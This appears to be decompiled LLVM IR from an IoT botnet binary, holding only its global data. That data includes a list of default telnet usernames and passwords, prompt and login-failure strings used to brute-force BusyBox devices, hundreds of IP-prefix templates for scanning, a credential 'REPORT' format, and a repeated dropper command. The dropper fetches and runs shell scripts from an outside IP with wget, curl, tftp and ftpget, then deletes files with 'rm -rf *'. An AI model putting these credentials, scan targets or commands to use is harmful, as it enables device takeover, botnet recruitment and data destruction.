source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2e00c.13 = global i32 0
@global_var_13254.17 = constant i32 -509558771
@global_var_2e4fc.20 = global i32 0
@global_var_2e500.21 = local_unnamed_addr global i32 0
@global_var_2e504.22 = local_unnamed_addr global i32 0
@global_var_2e1e8.25 = local_unnamed_addr global i32 4095
@global_var_2e1e4.28 = global i32 362436
@global_var_1fb9c.30 = constant [7 x i8] c"(null)\00"
@global_var_324fc.32 = local_unnamed_addr global i32 0
@global_var_1fba4.34 = constant [8 x i8] c"/bin/sh\00"
@global_var_1fbac.36 = constant [3 x i8] c"sh\00"
@global_var_1fbb0.38 = constant [3 x i8] c"-c\00"
@global_var_ff00.40 = constant i32 -369098714
@global_var_1fbb4.42 = constant i32 -1
@global_var_1ffb4.44 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1ffc4.46 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2e4e0.53 = global i32 0
@global_var_1ffd0.55 = constant [5 x i8] c"PING\00"
@global_var_1ffd8.57 = constant [14 x i8] c"gethostbyname\00"
@global_var_2e4e8.59 = global i32 0
@global_var_2e4ec.60 = local_unnamed_addr global i32 0
@global_var_34748.62 = global i32 0
@global_var_1ffe8.64 = constant [6 x i8] c":>%$#\00"
@global_var_1fff0.74 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1fffc.76 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_2000c.78 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_20018.80 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_20028.82 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_20034.84 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_20044.86 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_20050.88 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_20060.90 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_20070.92 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_20080.94 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_20090.96 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_2009c.98 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_200ac.100 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_200bc.102 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_200cc.104 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_200dc.106 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_200ec.108 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_200fc.110 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_2010c.112 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_20118.114 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_20124.116 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_20134.118 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_20140.120 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_2014c.122 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_20158.124 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_20164.126 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_20170.128 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_20180.130 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_20190.132 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_2019c.134 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_201ac.136 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_201b8.138 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_201c4.140 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_201d0.142 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_201dc.144 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_201e8.146 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_201f4.148 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_20200.150 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_20210.152 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_20220.154 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_20230.156 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_20240.158 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_20250.160 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_20260.162 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_20270.164 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_20280.166 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_20290.168 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_202a0.170 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_202b0.172 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_202c0.174 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_202d0.176 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_202e0.178 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_202f0.180 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_20300.182 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_20310.184 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_20320.186 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_20330.188 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_20340.190 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_20350.192 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_20360.194 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_20370.196 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_20380.198 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_20390.200 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_203a0.202 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_203b0.204 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_203c0.206 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_203d0.208 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_203e0.210 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_203f0.213 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_20400.215 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_20410.217 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_20420.219 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_20430.221 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_20440.223 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_20450.225 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_20460.227 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_20470.229 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_20480.231 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_20490.233 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_204a0.235 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_204b0.237 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_204c0.239 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_204d0.241 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_204e0.243 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_204f0.245 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_20500.247 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_20510.249 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_20520.251 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_20530.253 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_20540.255 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_20550.257 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_20560.259 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_20570.261 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_20580.263 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_20590.265 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_205a0.267 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_205b0.269 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_205c0.271 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_205cc.273 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_205dc.275 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_205ec.277 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_205fc.279 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_20608.281 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_20618.283 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_20628.285 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_20638.287 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_20648.289 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_20658.291 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_20668.293 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_20678.295 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_20688.297 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_20698.299 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_206a8.301 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_206b8.303 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_206c8.305 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_206d8.307 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_206e8.309 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_206f8.311 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_20704.313 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_20714.315 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_20724.317 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_20734.319 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_20744.321 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_20754.323 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_20764.325 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_20774.327 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_20784.329 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_20794.331 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_207a4.333 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_207b4.335 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_207c4.337 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_207d4.339 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_207e4.341 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_207f4.343 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_20804.345 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_20814.347 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_20824.349 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_20834.351 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_20844.353 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_20854.355 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_20864.357 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_20874.360 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_20884.362 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_20894.364 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_208a4.367 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_208b4.369 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_208c4.371 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_208d4.373 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_208e4.375 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_208f4.377 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_20900.379 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_20910.381 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_20920.383 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_20930.385 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_20940.387 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_20950.389 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_20960.391 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_20970.393 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_20980.395 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_20990.397 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_209a0.399 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_209b0.401 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_209c0.403 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_209d0.405 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_209e0.407 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_209f0.409 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_20a00.411 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_20a10.413 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_20a20.415 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_20a30.417 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_20a40.419 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_20a50.422 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_20a60.424 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_20a70.426 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_20a80.428 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_20a90.430 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_20aa0.432 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_20ab0.434 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_20ac0.436 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_20ad0.438 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_20ae0.440 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_20af0.442 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_20b00.444 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_20b10.446 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_20b20.448 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_20b30.450 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_20b40.452 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_20b50.454 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_20b60.456 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_20b70.458 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_20b80.460 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_20b90.462 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_20ba0.464 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_20bb0.466 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_20bc0.468 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_20bd0.470 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_20be0.472 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_2e1ec.475 = global i32 110
@global_var_20bf0.479 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_3473c.481 = global i32 0
@global_var_1fb88.483 = constant [8 x i8] c"BusyBox\00"
@global_var_1fb90.484 = constant i32 36
@global_var_1fb94.485 = constant i32 35
@global_var_1fb98.486 = constant [3 x i8] c"~#\00"
@global_var_2e19c.487 = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1fb88.483, i32 0, i32 0), i8* bitcast (i32* @global_var_1fb90.484 to i8*), i8* bitcast (i32* @global_var_1fb94.485 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1fb98.486, i32 0, i32 0)]
@global_var_1fb50.489 = constant [7 x i8] c"nvalid\00"
@global_var_1fb58.490 = constant [6 x i8] c"ailed\00"
@global_var_1fb60.491 = constant [9 x i8] c"ncorrect\00"
@global_var_1fb6c.492 = constant [6 x i8] c"enied\00"
@global_var_1fb74.493 = constant [5 x i8] c"rror\00"
@global_var_1fb7c.494 = constant [7 x i8] c"oodbye\00"
@global_var_1fb84.495 = constant [4 x i8] c"bad\00"
@global_var_2e17c.496 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1fb50.489, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fb58.490, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1fb60.491, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fb6c.492, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1fb74.493, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1fb7c.494, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fb84.495, i32 0, i32 0)]
@global_var_2e168 = external global i32
@global_var_1f7c8.503 = constant [7 x i8] c"666666\00"
@global_var_1f7d0.504 = constant [8 x i8] c"support\00"
@global_var_1f7dc.505 = constant [8 x i8] c"default\00"
@global_var_1f7e8.506 = constant [5 x i8] c"root\00"
@global_var_1f7f0.507 = constant [6 x i8] c"admin\00"
@global_var_1f7f8.508 = constant [11 x i8] c"supervisor\00"
@global_var_1f804.509 = constant [5 x i8] c"ubnt\00"
@global_var_1f80c.510 = constant i32 0
@global_var_1f810.511 = constant [5 x i8] c"1234\00"
@global_var_1f818.512 = constant [7 x i8] c"123456\00"
@global_var_1f820.513 = constant [5 x i8] c"vnpt\00"
@global_var_1f828.514 = constant [11 x i8] c"1234567890\00"
@global_var_1f834.515 = constant [7 x i8] c"antslq\00"
@global_var_1f83c.516 = constant [9 x i8] c"zyad1234\00"
@global_var_1f848.517 = constant [5 x i8] c"anko\00"
@global_var_1f850.518 = constant [5 x i8] c"tini\00"
@global_var_1f858.519 = constant [8 x i8] c"letacla\00"
@global_var_1f864.520 = constant [4 x i8] c"5up\00"
@global_var_1f86c.521 = constant [7 x i8] c"xc3511\00"
@global_var_1f874.522 = constant [703 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_2e0b4.523 = global [45 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f7c8.503, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f7d0.504, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f7dc.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f7f0.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f7f0.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f7f0.507, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f7f0.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f7d0.504, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f7f8.508, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f7f8.508, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f804.509, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f7c8.503, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f7d0.504, i32 0, i32 0), i8* bitcast (i32* @global_var_1f80c.510 to i8*), i8* bitcast (i32* @global_var_1f80c.510 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f7f0.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f810.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f818.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f810.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f820.513, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f828.514, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f7d0.504, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f834.515, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f83c.516, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f848.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f850.518, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f858.519, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f7f8.508, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f804.509, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f864.520, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f86c.521, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_1f874.522, i32 0, i32 0)]
@global_var_20bfc.525 = constant [3 x i8] c"\0D\0A\00"
@global_var_2e10c.527 = global [23 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f7c8.503, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f7d0.504, i32 0, i32 0), i8* bitcast (i32* @global_var_1f80c.510 to i8*), i8* bitcast (i32* @global_var_1f80c.510 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f7f0.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f810.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f7e8.506, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f818.512, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f810.511, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f820.513, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f828.514, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f7d0.504, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f834.515, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f83c.516, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f848.517, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f850.518, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f858.519, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f7f8.508, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f804.509, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f864.520, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f86c.521, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_1f874.522, i32 0, i32 0)]
@global_var_2e1b0.529 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1fb50.489, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fb58.490, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1fb60.491, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1fb6c.492, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1fb74.493, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1fb7c.494, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1fb84.495, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1fb88.483, i32 0, i32 0), i8* bitcast (i32* @global_var_1fb90.484 to i8*), i8* bitcast (i32* @global_var_1fb94.485 to i8*)]
@global_var_20c00.532 = constant i32 993024795
@global_var_20c6c.534 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_2e164.536 = local_unnamed_addr global [703 x i8]* @global_var_1f874.522
@global_var_20c7c.538 = constant [711 x i8] c"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A x00\00"
@global_var_20f44.540 = constant [3 x i8] c"AA\00"
@global_var_20f4c.542 = constant [704 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
